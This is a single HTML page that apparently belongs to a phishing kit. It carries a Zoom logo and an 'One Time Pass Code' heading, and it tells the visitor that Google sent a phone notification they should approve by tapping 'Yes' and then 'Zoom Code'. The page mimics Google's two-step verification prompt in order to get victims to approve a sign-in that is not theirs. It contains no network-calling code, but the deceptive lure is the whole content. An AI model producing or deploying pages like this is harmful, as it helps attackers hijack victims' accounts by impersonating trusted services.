<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>One Time Pass Code</title>

  <link rel="icon" type="image/png" href="../../logo.png" />
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #ffffff;
      color: #202124;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      padding: 10px 20px;
    }

    .container {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      padding: 5px;
    }

    /* Top Logo */
    .logo {
      width: 65px;
      height: 65px;
      object-fit: contain;
      margin-bottom: 6px;
      border-radius: 50%;
    }

    /* Main Title */
    h1 {
      font-size: 21px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 8px;
    }

    /* Phone Graphic Illustration (Aro onek boro kora holo) */
    .phone-illustration {
      width: 240px; 
      height: auto;
      object-fit: contain;
      margin-bottom: 8px;
    }

    /* Sub Heading */
    h2 {
      font-size: 19px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 6px;
    }

    /* Description Text */
    .desc-text {
      font-size: 15px;
      font-weight: 600;
      color: #1f2937;
      line-height: 1.5;
      margin-bottom: 35px; /* Nicher dike spacing barie dewa holo */
    }

    .desc-text span {
      font-weight: 800;
      color: #000000;
    }

    /* Resend Button (Nicher dike namano holo) */
    .btn-join {
      background-color: #007aff;
      color: white;
      padding: 13px 0;
      width: 82%;
      max-width: 280px;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.2);
      transition: background-color 0.2s, transform 0.1s;
      margin-top: auto; /* Button-ti ke shobseshe niche push korar jonno */
    }

    .btn-join:hover {
      background-color: #005ec4;
    }

    .btn-join:active {
      transform: scale(0.98);
    }

    /* Mobile Responsive Adjustments */
    @media (max-width: 360px) {
      .container {
        max-width: 100%;
      }
      .logo {
        width: 55px;
        height: 55px;
      }
      .phone-illustration {
        width: 200px;
      }
      h1 {
        font-size: 19px;
      }
      .desc-text {
        font-size: 14px;
        margin-bottom: 25px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <img class="logo" src="../../Zoom-Logo.png" alt="Logo">

    <h1>One Time Pass Code</h1>

    <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">

    <h2>Check your phone.</h2>

    <p class="desc-text">
      Google sent a notification to your phone.<br>
      <span>Tap Yes</span> on the notification<br>
      Then Tap Zoom Code
    </p>

    <button class="btn-join" onclick="window.location.href='../'">Resend</button>
  </div>

</body>
</html>
